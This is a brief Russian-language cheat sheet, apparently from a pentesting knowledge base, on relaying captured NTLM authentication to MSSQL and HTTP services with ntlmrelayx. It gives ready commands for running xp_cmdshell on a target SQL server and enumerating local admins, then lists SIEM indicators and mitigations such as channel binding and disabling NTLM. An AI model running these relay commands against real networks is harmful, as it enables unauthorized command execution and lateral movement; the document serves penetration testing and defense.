# MSSQL Relay / HTTP Relay через ntlmrelayx

## 🎯 Цель атаки
Использовать перехваченную NTLM-аутентификацию для выполнения действий на серверах MSSQL или HTTP-приложениях.

## 📋 Условия
- Доступ к целевым MSSQL/HTTP сервисам.
- Отключена проверка подписи NTLM (SMB/HTTP) или нет Channel Binding.

## 🔹 Пошагово (MSSQL Relay)
1. Запустить ntlmrelayx с целью MSSQL:
```bash
ntlmrelayx.py -t mssql://192.168.0.55 --execute "xp_cmdshell 'whoami'"
```
2. При аутентификации жертвы — команда выполняется на MSSQL-сервере.

## 🔹 Пошагово (HTTP Relay)
1. Запустить ntlmrelayx с целью HTTP:
```bash
ntlmrelayx.py -t http://intranet.domain.local --enum-local-admins
```

## 📊 SIEM
- Логи MSSQL о выполнении xp_cmdshell.
- HTTP-логи с NTLM-аутентификацией от неожиданных клиентов.

## 🛡 Защита
- Включить Channel Binding для HTTP.
- Запретить NTLM для MSSQL и HTTP.
- Ограничить доступ к MSSQL по сети.
